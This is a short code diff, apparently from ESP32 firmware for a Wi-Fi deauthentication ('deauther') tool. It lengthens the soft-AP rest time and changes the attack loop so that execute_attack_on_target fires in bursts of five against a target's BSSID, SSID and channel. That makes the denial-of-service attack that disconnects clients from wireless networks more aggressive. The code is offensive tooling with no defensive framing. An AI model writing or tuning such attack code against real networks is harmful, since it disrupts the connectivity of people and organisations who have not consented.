@@ -16,7 +16,7 @@
 // Syncronization times
 #define CHANNEL_SWITCH_DELAY 5   // Channel switch assestment time
 #define ATTACK_WINDOW        85  // RCO duration
-#define SOFTAP_REST_TIME     200   // Home channel time
+#define SOFTAP_REST_TIME     280   // Home channel time
 #define SINGLE_TARGET_ROOM   80
 #define SCAN_INTERVAL_US     30000000 // 30 seconds
 
@@ -280,7 +280,10 @@ static void deauther_send_frames(const target_info_t *target)
         vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
         int64_t start_time = esp_timer_get_time();
         while(true) {
-            execute_attack_on_target(target->bssid, (const char*)target->ssid, target->channel);
+            /* Burst */
+            for(int k=0; k<5; k++) {
+                execute_attack_on_target(target->bssid, (const char*)target->ssid, target->channel);
+            }
             vTaskDelay(pdMS_TO_TICKS(10)); 
             if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) break;
         }
